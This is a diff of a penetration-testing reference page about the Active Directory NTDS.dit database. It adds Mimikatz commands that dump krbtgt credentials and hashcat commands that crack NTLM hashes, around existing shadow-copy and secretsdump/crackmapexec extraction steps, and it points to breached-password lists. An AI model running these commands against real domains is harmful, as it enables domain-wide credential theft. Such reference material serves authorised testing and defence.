@@ -1,7 +1,5 @@
 # NTDS.dit
 
-
-
 The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.
 
 The important NTDS.dit file will be located in: %SystemRoom%/NTDS/ntds.dit This file is a database Extensible Storage Engine \(ESE\) and is "officially" composed by 3 tables:
@@ -116,10 +114,6 @@ esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
 
 \*\*\*\*
 
-\*\*\*\*
-
-\*\*\*\*
-
 ### Extracting hashes from NTDS.dit
 
 Once you have obtained the files NTDS.dit and SYSTEM you can use tools like secretsdump.py to extract the hashes:
@@ -164,9 +158,41 @@ cme smb 10.10.0.202 -u username -p password --ntds vss
 cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
 ```
 
+### Mimikatz
 
+{% hint style="info" %}
+Dumps credential data in an Active Directory domain when run on a Domain Controller.![warning](https://github.githubassets.com/images/icons/emoji/unicode/26a0.png) Requires administrator access with debug or Local SYSTEM rights
+{% endhint %}
 
+```text
+sekurlsa::krbtgt
+lsadump::lsa /inject /name:krbtgt
+```
 
+## **Crack NTLM hashes with hashcat**
 
+Useful when you want to have the clear text password or when you need to make stats about weak passwords.
 
+Recommended wordlists:
+
+Have I Been Powned \([https://hashes.org/download.php?hashlistId=7290&type=hfound](https://hashes.org/download.php?hashlistId=7290&type=hfound)\)
+
+Collection \#1 \(passwords from Data Breaches, might be illegal to possess\)
+
+```text
+# Basic wordlist
+# (-O) will Optimize for 32 characters or less passwords
+# (-w 4) will set the workload to "Insane" 
+$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r ./rules/best64.rule --opencl-device-types 1,2
+
+# Generate a custom mask based on a wordlist
+$ git clone https://github.com/iphelix/pack/blob/master/README
+$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask
+$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask
+```
+
+If the password is not a confidential data \(challenges/ctf\), you can use online "cracker" like :
+
+* [hashes.org](https://hashes.org/check.php)
+* [hashes.com](https://hashes.com/en/decrypt/hash)
 
